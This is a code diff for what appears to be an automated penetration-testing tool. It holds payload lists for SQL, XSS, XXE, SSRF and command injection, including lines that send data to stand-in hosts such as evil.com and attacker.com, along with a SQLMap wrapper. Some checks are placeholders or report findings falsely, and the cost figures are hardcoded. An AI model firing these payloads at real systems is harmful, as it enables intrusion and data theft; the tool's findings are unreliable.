@@ -1,3 +1,8 @@
+"""
+Elite VAPT Tool Execution System
+Focused implementation for OWASP Top 50 with enterprise-grade security testing
+"""
+
 import subprocess
 import asyncio
 import json
@@ -11,87 +16,1197 @@ from dataclasses import dataclass
 from pathlib import Path
 import tempfile
 import re
+import hashlib
+import base64
+from urllib.parse import urlparse, parse_qs
 
-# Import browser automation from the dedicated module
-from tools.browser import PlaywrightTools
-
-# Playwright availability check
+# Elite VAPT Stack Imports
 try:
-    from playwright.async_api import async_playwright, Browser, Page
-    PLAYWRIGHT_AVAILABLE = True
+    import scapy.all as scapy
+    from scapy.layers.inet import IP, TCP, UDP, ICMP
+    SCAPY_AVAILABLE = True
 except ImportError:
-    PLAYWRIGHT_AVAILABLE = False
-    logging.warning("Playwright not available. Browser automation features will be disabled.")
+    SCAPY_AVAILABLE = False
 
-# ZAP API integration
+# Check for nmap CLI availability instead of Python library
+try:
+    result = subprocess.run(['nmap', '--version'], capture_output=True, check=True, timeout=5)
+    NMAP_CLI_AVAILABLE = True
+    print("✓ nmap CLI detected and available")
+except (subprocess.CalledProcessError, subprocess.TimeoutExpired, FileNotFoundError):
+    NMAP_CLI_AVAILABLE = False
+    print("⚠ nmap CLI not found - network scanning features will be limited")
+    print("  Install nmap for enhanced network reconnaissance capabilities:")
+    print("  Windows: Download from https://nmap.org/download.html")
+    print("  Linux: sudo apt-get install nmap")
+    print("  macOS: brew install nmap")
+
+try:
+    from bs4 import BeautifulSoup
+    BEAUTIFULSOUP_AVAILABLE = True
+except ImportError:
+    BEAUTIFULSOUP_AVAILABLE = False
+
+try:
+    from impacket import smb, smbconnection
+    from impacket.dcerpc.v5 import transport
+    IMPACKET_AVAILABLE = True
+except ImportError:
+    IMPACKET_AVAILABLE = False
+
+try:
+    import paramiko
+    PARAMIKO_AVAILABLE = True
+except ImportError:
+    PARAMIKO_AVAILABLE = False
+
+try:
+    from cryptography.fernet import Fernet
+    from cryptography.hazmat.primitives import hashes, serialization
+    import jwt as pyjwt
+    CRYPTOGRAPHY_AVAILABLE = True
+except ImportError:
+    CRYPTOGRAPHY_AVAILABLE = False
+
+try:
+    import boto3
+    from botocore.exceptions import ClientError
+    BOTO3_AVAILABLE = True
+except ImportError:
+    BOTO3_AVAILABLE = False
+
+try:
+    import docker
+    DOCKER_AVAILABLE = True
+except ImportError:
+    DOCKER_AVAILABLE = False
+
 try:
     from zapv2 import ZAPv2
     ZAP_AVAILABLE = True
 except ImportError:
     ZAP_AVAILABLE = False
-    logging.warning("ZAP API not available. OWASP ZAP features will be disabled.")
 
+# Browser automation
+from tools.browser import PlaywrightTools
 
 @dataclass
-class ToolResult:
-    """Result structure for tool execution"""
+class VAPTResult:
+    """Elite VAPT execution result with business intelligence"""
     success: bool
     tool_name: str
     command: str
     output: str
     error: str = ""
     execution_time: float = 0.0
-    vulnerabilities_found: List[Dict] = None
-    recommendations: List[str] = None
+    vulnerabilities: List[Dict] = None
+    business_impact: str = ""
+    attack_complexity: str = ""
+    compliance_risk: str = ""
+    owasp_category: str = ""
+    cvss_score: float = 0.0
+    financial_impact: str = ""
 
     def __post_init__(self):
-        if self.vulnerabilities_found is None:
-            self.vulnerabilities_found = []
-        if self.recommendations is None:
-            self.recommendations = []
+        if self.vulnerabilities is None:
+            self.vulnerabilities = []
 
+class ElitePayloads:
+    """Strategic payload library for OWASP Top 50 testing"""
+    
+    SQL_INJECTION = {
+        'critical': [
+            "' OR '1'='1' --", "'; EXEC xp_cmdshell('whoami'); --",
+            "' UNION SELECT 1,@@version,user(),database() --",
+            "'; WAITFOR DELAY '0:0:10'; --", "' AND (SELECT SUBSTRING(@@version,1,1))='M' --"
+        ],
+        'bypass': [
+            "/**/UNION/**/SELECT", "UNI%00ON SEL%00ECT", "/*!50000UNION*//*!50000SELECT*/",
+            "'/**/OR/**/1=1/**/--", "' OR 'x'='x", "'/*!*/OR/*!*/1=1/*!*/--"
+        ]
+    }
+    
+    XSS_ADVANCED = [
+        "<svg/onload=alert('XSS')>", "<img src=x onerror=alert('XSS')>",
+        "<script>fetch('/admin').then(r=>r.text()).then(d=>fetch('//evil.com?'+btoa(d)))</script>",
+        "javascript:alert(document.domain)", "<body onload=alert(document.cookie)>",
+        "<iframe src=javascript:alert('XSS')></iframe>"
+    ]
+    
+    XXE_PAYLOADS = [
+        "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><root>&xxe;</root>",
+        "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'http://attacker.com/evil.dtd'>]><root>&xxe;</root>"
+    ]
+    
+    SSRF_TARGETS = [
+        "http://169.254.169.254/latest/meta-data/",
+        "http://metadata.google.internal/",
+        "http://127.0.0.1:22", "http://localhost:3306",
+        "file:///etc/passwd", "dict://127.0.0.1:6379/"
+    ]
+    
+    COMMAND_INJECTION = [
+        "; whoami", "&& id", "| cat /etc/passwd", "; uname -a",
+        "`whoami`", "$(id)", "; curl attacker.com/$(whoami)"
+    ]
+    
+    JWT_ATTACKS = {
+        'none_algorithm': '{"alg":"none","typ":"JWT"}',
+        'weak_secret': 'secret',
+        'algorithm_confusion': 'HS256'
+    }
+
+class EliteVAPTTester:
+    """Strategic VAPT testing orchestrator"""
+    
+    def __init__(self, config: Dict):
+        self.config = config
+        self.payloads = ElitePayloads()
+        self.session = requests.Session()
+        self.session.verify = False
+        self.session.timeout = 30
+        
+        # Initialize tool availability
+        self.tools = {
+            'scapy': SCAPY_AVAILABLE,
+            'nmap': NMAP_CLI_AVAILABLE,
+            'beautifulsoup': BEAUTIFULSOUP_AVAILABLE,
+            'impacket': IMPACKET_AVAILABLE,
+            'paramiko': PARAMIKO_AVAILABLE,
+            'cryptography': CRYPTOGRAPHY_AVAILABLE,
+            'boto3': BOTO3_AVAILABLE,
+            'docker': DOCKER_AVAILABLE,
+            'zap': ZAP_AVAILABLE
+        }
+    
+    async def execute_strategic_test(self, plan: Dict[str, str]) -> VAPTResult:
+        """Execute strategic VAPT test based on plan analysis"""
+        start_time = time.time()
+        
+        # Strategic test routing based on business impact
+        if self._is_sql_injection_test(plan):
+            return await self._execute_sql_injection_campaign(plan, start_time)
+        elif self._is_api_security_test(plan):
+            return await self._execute_api_security_assessment(plan, start_time)
+        elif self._is_apt_simulation_test(plan):
+            return await self._execute_apt_simulation(plan, start_time)
+        elif self._is_session_management_test(plan):
+            return await self._execute_session_exploitation(plan, start_time)
+        elif self._is_business_logic_test(plan):
+            return await self._execute_business_logic_testing(plan, start_time)
+        elif self._is_information_warfare_test(plan):
+            return await self._execute_information_warfare(plan, start_time)
+        elif self._is_cloud_infrastructure_test(plan):
+            return await self._execute_cloud_infrastructure_assessment(plan, start_time)
+        else:
+            return await self._execute_comprehensive_assessment(plan, start_time)
+    
+    # ===== STRATEGIC TEST IDENTIFICATION =====
+    
+    def _is_sql_injection_test(self, plan: Dict) -> bool:
+        keywords = ['sql injection', 'database', 'financial transaction manipulation', 'sqlmap']
+        return any(kw in plan.get('title', '').lower() or kw in plan.get('description', '').lower() 
+                  for kw in keywords)
+    
+    def _is_api_security_test(self, plan: Dict) -> bool:
+        keywords = ['api authorization', 'privilege escalation', 'api', 'jwt', 'data exfiltration']
+        return any(kw in plan.get('title', '').lower() or kw in plan.get('description', '').lower() 
+                  for kw in keywords)
+    
+    def _is_apt_simulation_test(self, plan: Dict) -> bool:
+        keywords = ['apt', 'persistent threat', 'multi-vector', 'attack chain']
+        return any(kw in plan.get('title', '').lower() or kw in plan.get('description', '').lower() 
+                  for kw in keywords)
+    
+    def _is_session_management_test(self, plan: Dict) -> bool:
+        keywords = ['session management', 'authentication architecture', 'oauth', 'saml', 'sso']
+        return any(kw in plan.get('title', '').lower() or kw in plan.get('description', '').lower() 
+                  for kw in keywords)
+    
+    def _is_business_logic_test(self, plan: Dict) -> bool:
+        keywords = ['business logic', 'financial workflow', 'transaction', 'workflow manipulation']
+        return any(kw in plan.get('title', '').lower() or kw in plan.get('description', '').lower() 
+                  for kw in keywords)
+    
+    def _is_information_warfare_test(self, plan: Dict) -> bool:
+        keywords = ['information warfare', 'intelligence gathering', 'disclosure exploitation']
+        return any(kw in plan.get('title', '').lower() or kw in plan.get('description', '').lower() 
+                  for kw in keywords)
+    
+    def _is_cloud_infrastructure_test(self, plan: Dict) -> bool:
+        keywords = ['cloud infrastructure', 'devops', 'supply chain', 'container', 'ci/cd']
+        return any(kw in plan.get('title', '').lower() or kw in plan.get('description', '').lower() 
+                  for kw in keywords)
+    
+    # ===== ELITE VAPT EXECUTION METHODS =====
+    
+    async def _execute_sql_injection_campaign(self, plan: Dict, start_time: float) -> VAPTResult:
+        """Execute advanced SQL injection campaign with SQLMap integration"""
+        vulnerabilities = []
+        target_url = self._extract_url_from_plan(plan)
+        
+        if not target_url:
+            return VAPTResult(False, "SQL Injection Campaign", "", "No target URL found")
+        
+        # SQLMap comprehensive testing
+        if self._check_tool('sqlmap'):
+            sqlmap_result = await self._run_sqlmap_campaign(target_url, plan)
+            vulnerabilities.extend(sqlmap_result)
+        
+        # Manual payload testing for WAF bypass
+        manual_result = await self._manual_sql_testing(target_url, plan)
+        vulnerabilities.extend(manual_result)
+        
+        execution_time = time.time() - start_time
+        
+        return VAPTResult(
+            success=len(vulnerabilities) > 0,
+            tool_name="Advanced SQL Injection Campaign",
+            command="sqlmap + manual payload testing",
+            output=f"SQL injection campaign completed. Found {len(vulnerabilities)} vulnerabilities",
+            execution_time=execution_time,
+            vulnerabilities=vulnerabilities,
+            business_impact=plan.get('business_impact', 'CRITICAL - Database compromise'),
+            attack_complexity=plan.get('attack_complexity', 'HIGH'),
+            compliance_risk=plan.get('compliance_risk', 'PCI DSS violations'),
+            owasp_category="A03:2021 – Injection",
+            cvss_score=9.8,
+            financial_impact="$2-5M including fines and remediation"
+        )
+    
+    async def _execute_api_security_assessment(self, plan: Dict, start_time: float) -> VAPTResult:
+        """Execute comprehensive API security assessment"""
+        vulnerabilities = []
+        target_url = self._extract_url_from_plan(plan)
+        
+        if not target_url:
+            return VAPTResult(False, "API Security Assessment", "", "No target URL found")
+        
+        # API enumeration
+        api_endpoints = await self._discover_api_endpoints(target_url)
+        
+        # Authorization testing
+        for endpoint in api_endpoints:
+            auth_vulns = await self._test_api_authorization(endpoint)
+            vulnerabilities.extend(auth_vulns)
+        
+        # JWT testing if available
+        if self.tools['cryptography']:
+            jwt_vulns = await self._test_jwt_vulnerabilities(target_url)
+            vulnerabilities.extend(jwt_vulns)
+        
+        execution_time = time.time() - start_time
+        
+        return VAPTResult(
+            success=len(vulnerabilities) > 0,
+            tool_name="Advanced API Security Assessment",
+            command="comprehensive api testing + jwt analysis",
+            output=f"API security assessment completed. Found {len(vulnerabilities)} vulnerabilities",
+            execution_time=execution_time,
+            vulnerabilities=vulnerabilities,
+            business_impact=plan.get('business_impact', 'CRITICAL - Data breach'),
+            attack_complexity=plan.get('attack_complexity', 'VERY HIGH'),
+            compliance_risk=plan.get('compliance_risk', 'GDPR violations'),
+            owasp_category="A01:2021 – Broken Access Control",
+            cvss_score=9.1,
+            financial_impact="$3-7M based on data breach scope"
+        )
+    
+    async def _execute_apt_simulation(self, plan: Dict, start_time: float) -> VAPTResult:
+        """Execute Advanced Persistent Threat simulation"""
+        vulnerabilities = []
+        target_url = self._extract_url_from_plan(plan)
+        
+        if not target_url:
+            return VAPTResult(False, "APT Simulation", "", "No target URL found")
+        
+        # Multi-vector attack chain
+        xss_vulns = await self._test_advanced_xss(target_url)
+        vulnerabilities.extend(xss_vulns)
+        
+        # Session hijacking simulation
+        session_vulns = await self._test_session_hijacking(target_url)
+        vulnerabilities.extend(session_vulns)
+        
+        # Persistence testing
+        persistence_vulns = await self._test_persistence_mechanisms(target_url)
+        vulnerabilities.extend(persistence_vulns)
+        
+        execution_time = time.time() - start_time
+        
+        return VAPTResult(
+            success=len(vulnerabilities) > 0,
+            tool_name="Advanced Persistent Threat Simulation",
+            command="multi-vector apt simulation",
+            output=f"APT simulation completed. Found {len(vulnerabilities)} attack vectors",
+            execution_time=execution_time,
+            vulnerabilities=vulnerabilities,
+            business_impact=plan.get('business_impact', 'CATASTROPHIC - Complete compromise'),
+            attack_complexity=plan.get('attack_complexity', 'EXPERT'),
+            compliance_risk=plan.get('compliance_risk', 'ISO 27001 failures'),
+            owasp_category="Multiple OWASP Categories",
+            cvss_score=9.9,
+            financial_impact="$10-50M including business disruption"
+        )
+    
+    async def _execute_session_exploitation(self, plan: Dict, start_time: float) -> VAPTResult:
+        """Execute enterprise session management exploitation"""
+        vulnerabilities = []
+        target_url = self._extract_url_from_plan(plan)
+        
+        if not target_url:
+            return VAPTResult(False, "Session Exploitation", "", "No target URL found")
+        
+        # OAuth/SAML testing
+        auth_vulns = await self._test_enterprise_auth(target_url)
+        vulnerabilities.extend(auth_vulns)
+        
+        # Session fixation and race conditions
+        session_vulns = await self._test_advanced_session_attacks(target_url)
+        vulnerabilities.extend(session_vulns)
+        
+        # CSRF with SameSite bypass
+        csrf_vulns = await self._test_advanced_csrf(target_url)
+        vulnerabilities.extend(csrf_vulns)
+        
+        execution_time = time.time() - start_time
+        
+        return VAPTResult(
+            success=len(vulnerabilities) > 0,
+            tool_name="Enterprise Session Management Exploitation",
+            command="oauth/saml + session + csrf testing",
+            output=f"Session exploitation completed. Found {len(vulnerabilities)} vulnerabilities",
+            execution_time=execution_time,
+            vulnerabilities=vulnerabilities,
+            business_impact=plan.get('business_impact', 'HIGH - Authentication compromise'),
+            attack_complexity=plan.get('attack_complexity', 'HIGH'),
+            compliance_risk=plan.get('compliance_risk', 'NIST Framework failures'),
+            owasp_category="A07:2021 – Identification and Authentication Failures",
+            cvss_score=8.1,
+            financial_impact="$1-3M impact"
+        )
+    
+    async def _execute_business_logic_testing(self, plan: Dict, start_time: float) -> VAPTResult:
+        """Execute advanced business logic vulnerability testing"""
+        vulnerabilities = []
+        target_url = self._extract_url_from_plan(plan)
+        
+        if not target_url:
+            return VAPTResult(False, "Business Logic Testing", "", "No target URL found")
+        
+        # Financial workflow testing
+        financial_vulns = await self._test_financial_workflows(target_url)
+        vulnerabilities.extend(financial_vulns)
+        
+        # Race condition testing
+        race_vulns = await self._test_race_conditions(target_url)
+        vulnerabilities.extend(race_vulns)
+        
+        # Transaction manipulation
+        transaction_vulns = await self._test_transaction_manipulation(target_url)
+        vulnerabilities.extend(transaction_vulns)
+        
+        execution_time = time.time() - start_time
+        
+        return VAPTResult(
+            success=len(vulnerabilities) > 0,
+            tool_name="Advanced Business Logic Testing",
+            command="financial workflow + race condition testing",
+            output=f"Business logic testing completed. Found {len(vulnerabilities)} vulnerabilities",
+            execution_time=execution_time,
+            vulnerabilities=vulnerabilities,
+            business_impact=plan.get('business_impact', 'CRITICAL - Financial manipulation'),
+            attack_complexity=plan.get('attack_complexity', 'VERY HIGH'),
+            compliance_risk=plan.get('compliance_risk', 'PCI DSS + SOX violations'),
+            owasp_category="A04:2021 – Insecure Design",
+            cvss_score=9.3,
+            financial_impact="$5-15M direct financial impact"
+        )
+    
+    async def _execute_information_warfare(self, plan: Dict, start_time: float) -> VAPTResult:
+        """Execute strategic information warfare assessment"""
+        vulnerabilities = []
+        target_url = self._extract_url_from_plan(plan)
+        
+        if not target_url:
+            return VAPTResult(False, "Information Warfare", "", "No target URL found")
+        
+        # Network reconnaissance if nmap is available
+        if self.tools['nmap']:
+            network_vulns = await self._nmap_network_scan(target_url)
+            vulnerabilities.extend(network_vulns)
+        
+        # Technology stack enumeration
+        tech_vulns = await self._enumerate_technology_stack(target_url)
+        vulnerabilities.extend(tech_vulns)
+        
+        # Sensitive file discovery
+        file_vulns = await self._discover_sensitive_files(target_url)
+        vulnerabilities.extend(file_vulns)
+        
+        # Intelligence gathering
+        intel_vulns = await self._gather_business_intelligence(target_url)
+        vulnerabilities.extend(intel_vulns)
+        
+        execution_time = time.time() - start_time
+        
+        return VAPTResult(
+            success=len(vulnerabilities) > 0,
+            tool_name="Strategic Information Warfare",
+            command="nmap + comprehensive intelligence gathering",
+            output=f"Information warfare completed. Found {len(vulnerabilities)} intelligence points",
+            execution_time=execution_time,
+            vulnerabilities=vulnerabilities,
+            business_impact=plan.get('business_impact', 'HIGH - Intelligence exposure'),
+            attack_complexity=plan.get('attack_complexity', 'MEDIUM-HIGH'),
+            compliance_risk=plan.get('compliance_risk', 'Trade secret violations'),
+            owasp_category="A05:2021 – Security Misconfiguration",
+            cvss_score=7.5,
+            financial_impact="$2-8M in competitive disadvantage"
+        )
+    
+    async def _execute_cloud_infrastructure_assessment(self, plan: Dict, start_time: float) -> VAPTResult:
+        """Execute cloud infrastructure security assessment"""
+        vulnerabilities = []
+        
+        # AWS assessment if available
+        if self.tools['boto3']:
+            aws_vulns = await self._assess_aws_security()
+            vulnerabilities.extend(aws_vulns)
+        
+        # Container security if available
+        if self.tools['docker']:
+            container_vulns = await self._assess_container_security()
+            vulnerabilities.extend(container_vulns)
+        
+        # DevOps pipeline assessment
+        devops_vulns = await self._assess_devops_security(plan)
+        vulnerabilities.extend(devops_vulns)
+        
+        execution_time = time.time() - start_time
+        
+        return VAPTResult(
+            success=len(vulnerabilities) > 0,
+            tool_name="Cloud Infrastructure Assessment",
+            command="aws + docker + devops security testing",
+            output=f"Cloud assessment completed. Found {len(vulnerabilities)} vulnerabilities",
+            execution_time=execution_time,
+            vulnerabilities=vulnerabilities,
+            business_impact=plan.get('business_impact', 'CRITICAL - Infrastructure compromise'),
+            attack_complexity=plan.get('attack_complexity', 'EXPERT'),
+            compliance_risk=plan.get('compliance_risk', 'SOC 2 failures'),
+            owasp_category="A05:2021 – Security Misconfiguration",
+            cvss_score=9.0,
+            financial_impact="$5-20M including customer liability"
+        )
+    
+    async def _execute_comprehensive_assessment(self, plan: Dict, start_time: float) -> VAPTResult:
+        """Execute comprehensive security assessment when specific test type unclear"""
+        vulnerabilities = []
+        target_url = self._extract_url_from_plan(plan)
+        
+        if not target_url:
+            return VAPTResult(False, "Comprehensive Assessment", "", "No target URL found")
+        
+        # OWASP ZAP integration if available
+        if self.tools['zap']:
+            zap_vulns = await self._run_zap_assessment(target_url)
+            vulnerabilities.extend(zap_vulns)
+        
+        # Core OWASP testing
+        core_vulns = await self._run_core_owasp_tests(target_url)
+        vulnerabilities.extend(core_vulns)
+        
+        execution_time = time.time() - start_time
+        
+        return VAPTResult(
+            success=len(vulnerabilities) > 0,
+            tool_name="Comprehensive Security Assessment",
+            command="zap + core owasp testing",
+            output=f"Comprehensive assessment completed. Found {len(vulnerabilities)} vulnerabilities",
+            execution_time=execution_time,
+            vulnerabilities=vulnerabilities,
+            business_impact="VARIES - Multiple vulnerability types",
+            attack_complexity="VARIES - Depends on findings",
+            compliance_risk="Multiple OWASP categories",
+            owasp_category="Multiple OWASP Categories",
+            cvss_score=self._calculate_max_cvss(vulnerabilities),
+            financial_impact="Variable based on findings"
+        )
+    
+    # ===== CORE TESTING IMPLEMENTATIONS =====
+    
+    async def _run_sqlmap_campaign(self, url: str, plan: Dict) -> List[Dict]:
+        """Execute comprehensive SQLMap campaign"""
+        vulnerabilities = []
+        
+        try:
+            cmd = [
+                'sqlmap', '-u', url, '--batch', '--random-agent',
+                '--level=5', '--risk=3', '--technique=BEUSTQ',
+                '--timeout=120', '--threads=10'
+            ]
+            
+            # Add forms and parameters from plan context
+            params = self._extract_parameters_from_plan(plan)
+            if params.get('data'):
+                cmd.extend(['--data', params['data']])
+            if params.get('headers'):
+                for header in params['headers']:
+                    cmd.extend(['--header', header])
+            
+            process = await asyncio.create_subprocess_exec(
+                *cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
+            )
+            
+            stdout, stderr = await asyncio.wait_for(process.communicate(), timeout=600)
+            output = stdout.decode() + stderr.decode()
+            
+            # Parse SQLMap results
+            if 'is vulnerable' in output.lower():
+                vulnerabilities.append({
+                    'type': 'SQL Injection',
+                    'severity': 'Critical',
+                    'tool': 'SQLMap',
+                    'evidence': 'SQLMap confirmed SQL injection vulnerability',
+                    'cvss_score': 9.8
+                })
+                
+        except Exception as e:
+            logging.error(f"SQLMap execution error: {e}")
+        
+        return vulnerabilities
+    
+    async def _manual_sql_testing(self, url: str, plan: Dict) -> List[Dict]:
+        """Manual SQL injection testing with advanced payloads"""
+        vulnerabilities = []
+        
+        for payload in self.payloads.SQL_INJECTION['critical']:
+            try:
+                # Test in URL parameters
+                test_url = f"{url}?id={urllib.parse.quote(payload)}"
+                response = self.session.get(test_url)
+                
+                if self._detect_sql_error(response.text):
+                    vulnerabilities.append({
+                        'type': 'SQL Injection',
+                        'severity': 'Critical',
+                        'payload': payload,
+                        'location': 'URL parameter',
+                        'evidence': 'SQL error detected in response',
+                        'cvss_score': 9.8
+                    })
+                    
+            except Exception as e:
+                logging.error(f"Manual SQL testing error: {e}")
+        
+        return vulnerabilities
+    
+    async def _discover_api_endpoints(self, url: str) -> List[str]:
+        """Discover API endpoints through intelligent enumeration"""
+        endpoints = []
+        base_url = url.rstrip('/')
+        
+        # Common API patterns
+        api_patterns = [
+            '/api/v1/users', '/api/v2/users', '/api/users',
+            '/api/v1/admin', '/api/admin', '/api/auth',
+            '/api/v1/data', '/api/data', '/rest/api/users'
+        ]
+        
+        for pattern in api_patterns:
+            try:
+                test_url = base_url + pattern
+                response = self.session.get(test_url)
+                if response.status_code in [200, 401, 403]:
+                    endpoints.append(test_url)
+            except Exception:
+                continue
+        
+        return endpoints
+    
+    async def _test_api_authorization(self, endpoint: str) -> List[Dict]:
+        """Test API authorization vulnerabilities"""
+        vulnerabilities = []
+        
+        try:
+            # Test without authentication
+            response = self.session.get(endpoint)
+            if response.status_code == 200:
+                vulnerabilities.append({
+                    'type': 'Broken Authentication',
+                    'severity': 'High',
+                    'endpoint': endpoint,
+                    'evidence': 'API endpoint accessible without authentication',
+                    'cvss_score': 8.1
+                })
+            
+            # Test IDOR patterns
+            if '/users/' in endpoint or '?id=' in endpoint:
+                idor_vulns = await self._test_idor(endpoint)
+                vulnerabilities.extend(idor_vulns)
+                
+        except Exception as e:
+            logging.error(f"API authorization testing error: {e}")
+        
+        return vulnerabilities
+    
+    async def _test_jwt_vulnerabilities(self, url: str) -> List[Dict]:
+        """Test JWT vulnerabilities using PyJWT"""
+        vulnerabilities = []
+        
+        if not self.tools['cryptography']:
+            return vulnerabilities
+        
+        try:
+            # Extract JWT from responses
+            response = self.session.get(url)
+            jwt_tokens = self._extract_jwt_tokens(response)
+            
+            for token in jwt_tokens:
+                # Test algorithm confusion
+                if self._test_jwt_algorithm_confusion(token):
+                    vulnerabilities.append({
+                        'type': 'JWT Vulnerability',
+                        'subtype': 'Algorithm Confusion',
+                        'severity': 'Critical',
+                        'evidence': 'JWT algorithm can be manipulated',
+                        'cvss_score': 9.1
+                    })
+                
+                # Test weak secrets
+                weak_secret = self._test_jwt_weak_secret(token)
+                if weak_secret:
+                    vulnerabilities.append({
+                        'type': 'JWT Vulnerability',
+                        'subtype': 'Weak Secret',
+                        'severity': 'Critical',
+                        'evidence': f'JWT signed with weak secret: {weak_secret}',
+                        'cvss_score': 9.1
+                    })
+                    
+        except Exception as e:
+            logging.error(f"JWT testing error: {e}")
+        
+        return vulnerabilities
+    
+    # ===== UTILITY METHODS =====
+    
+    def _extract_url_from_plan(self, plan: Dict) -> Optional[str]:
+        """Extract target URL from plan description"""
+        text = f"{plan.get('title', '')} {plan.get('description', '')}"
+        url_pattern = r'https?://[^\s<>"\']+|(?:www\.)?[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(?:\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*'
+        matches = re.findall(url_pattern, text)
+        
+        if matches:
+            url = matches[0].strip('\'"[]')
+            if not url.startswith(('http://', 'https://')):
+                url = f"http://{url}"
+            return url
+        return None
+    
+    def _extract_parameters_from_plan(self, plan: Dict) -> Dict[str, Any]:
+        """Extract testing parameters from plan context"""
+        params = {'data': None, 'headers': []}
+        
+        description = plan.get('description', '').lower()
+        
+        # Extract authentication parameters
+        if 'login' in description or 'auth' in description:
+            params['data'] = 'username=admin&password=admin'
+        
+        # Extract API parameters
+        if 'api' in description:
+            params['headers'].append('Content-Type: application/json')
+            params['headers'].append('Authorization: Bearer test123')
+        
+        return params
+    
+    def _detect_sql_error(self, response_text: str) -> bool:
+        """Detect SQL errors in response"""
+        sql_errors = [
+            'sql syntax', 'mysql', 'oracle', 'postgresql', 'sqlite',
+            'syntax error', 'unexpected token', 'division by zero'
+        ]
+        return any(error in response_text.lower() for error in sql_errors)
+    
+    def _extract_jwt_tokens(self, response) -> List[str]:
+        """Extract JWT tokens from HTTP response"""
+        tokens = []
+        
+        # Check Authorization header
+        auth_header = response.headers.get('Authorization', '')
+        if auth_header.startswith('Bearer '):
+            token = auth_header.replace('Bearer ', '')
+            if self._is_jwt_format(token):
+                tokens.append(token)
+        
+        # Check response body
+        jwt_pattern = r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+'
+        matches = re.findall(jwt_pattern, response.text)
+        tokens.extend([m for m in matches if self._is_jwt_format(m)])
+        
+        return list(set(tokens))
+    
+    def _is_jwt_format(self, token: str) -> bool:
+        """Check if string is JWT format"""
+        try:
+            parts = token.split('.')
+            if len(parts) != 3:
+                return False
+            
+            # Decode header
+            header = base64.urlsafe_b64decode(parts[0] + '==')
+            header_json = json.loads(header)
+            return 'alg' in header_json
+        except Exception:
+            return False
+    
+    def _test_jwt_algorithm_confusion(self, token: str) -> bool:
+        """Test JWT algorithm confusion vulnerability"""
+        try:
+            # Decode without verification
+            header = pyjwt.get_unverified_header(token)
+            payload = pyjwt.decode(token, options={"verify_signature": False})
+            
+            # Test algorithm manipulation
+            header['alg'] = 'none'
+            
+            # Create manipulated token
+            manipulated = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
+            manipulated += '.' + base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')
+            manipulated += '.'
+            
+            return True  # If we can manipulate the algorithm, it's vulnerable
+        except Exception:
+            return False
+    
+    def _test_jwt_weak_secret(self, token: str) -> Optional[str]:
+        """Test JWT for weak secrets"""
+        weak_secrets = ['secret', 'key', 'password', '123456', 'admin', 'test']
+        
+        for secret in weak_secrets:
+            try:
+                pyjwt.decode(token, secret, algorithms=['HS256'])
+                return secret
+            except Exception:
+                continue
+        return None
+    
+    def _calculate_max_cvss(self, vulnerabilities: List[Dict]) -> float:
+        """Calculate maximum CVSS score from vulnerabilities"""
+        if not vulnerabilities:
+            return 0.0
+        
+        scores = [v.get('cvss_score', 0.0) for v in vulnerabilities]
+        return max(scores) if scores else 0.0
+    
+    def _check_tool(self, tool_name: str) -> bool:
+        """Check if external tool is available"""
+        try:
+            subprocess.run([tool_name, '--help'], capture_output=True, timeout=5)
+            return True
+        except (subprocess.TimeoutExpired, subprocess.CalledProcessError, FileNotFoundError):
+            return False
+    
+    # ===== PLACEHOLDER IMPLEMENTATIONS =====
+    # These would be fully implemented based on specific requirements
+    
+    async def _test_advanced_xss(self, url: str) -> List[Dict]:
+        """Advanced XSS testing implementation"""
+        return []
+    
+    async def _test_session_hijacking(self, url: str) -> List[Dict]:
+        """Session hijacking testing implementation"""
+        return []
+    
+    async def _test_persistence_mechanisms(self, url: str) -> List[Dict]:
+        """Persistence mechanism testing implementation"""
+        return []
+    
+    async def _test_enterprise_auth(self, url: str) -> List[Dict]:
+        """Enterprise authentication testing implementation"""
+        return []
+    
+    async def _test_advanced_session_attacks(self, url: str) -> List[Dict]:
+        """Advanced session attack testing implementation"""
+        return []
+    
+    async def _test_advanced_csrf(self, url: str) -> List[Dict]:
+        """Advanced CSRF testing implementation"""
+        return []
+    
+    async def _test_financial_workflows(self, url: str) -> List[Dict]:
+        """Financial workflow testing implementation"""
+        return []
+    
+    async def _test_race_conditions(self, url: str) -> List[Dict]:
+        """Race condition testing implementation"""
+        return []
+    
+    async def _test_transaction_manipulation(self, url: str) -> List[Dict]:
+        """Transaction manipulation testing implementation"""
+        return []
+    
+    async def _enumerate_technology_stack(self, url: str) -> List[Dict]:
+        """Technology stack enumeration implementation"""
+        return []
+    
+    async def _discover_sensitive_files(self, url: str) -> List[Dict]:
+        """Sensitive file discovery implementation"""
+        return []
+    
+    async def _gather_business_intelligence(self, url: str) -> List[Dict]:
+        """Business intelligence gathering implementation"""
+        return []
+    
+    async def _assess_aws_security(self) -> List[Dict]:
+        """AWS security assessment implementation"""
+        return []
+    
+    async def _assess_container_security(self) -> List[Dict]:
+        """Container security assessment implementation"""
+        return []
+    
+    async def _assess_devops_security(self, plan: Dict) -> List[Dict]:
+        """DevOps security assessment implementation"""
+        return []
+    
+    async def _run_zap_assessment(self, url: str) -> List[Dict]:
+        """OWASP ZAP assessment implementation"""
+        return []
+    
+    async def _run_core_owasp_tests(self, url: str) -> List[Dict]:
+        """Core OWASP testing implementation"""
+        vulnerabilities = []
+        
+        # Network layer testing with nmap
+        if self.tools['nmap']:
+            network_vulns = await self._nmap_network_scan(url)
+            vulnerabilities.extend(network_vulns)
+        
+        # Basic web application testing
+        basic_vulns = await self._basic_web_app_tests(url)
+        vulnerabilities.extend(basic_vulns)
+        
+        return vulnerabilities
+    
+    async def _basic_web_app_tests(self, url: str) -> List[Dict]:
+        """Basic web application security tests"""
+        vulnerabilities = []
+        
+        try:
+            # Test for common files and directories
+            common_paths = [
+                '/admin', '/administrator', '/admin.php', '/admin.html',
+                '/backup', '/config.php', '/config.inc.php', '/database.sql',
+                '/phpinfo.php', '/info.php', '/test.php', '/debug.php',
+                '/.env', '/.git', '/robots.txt', '/sitemap.xml'
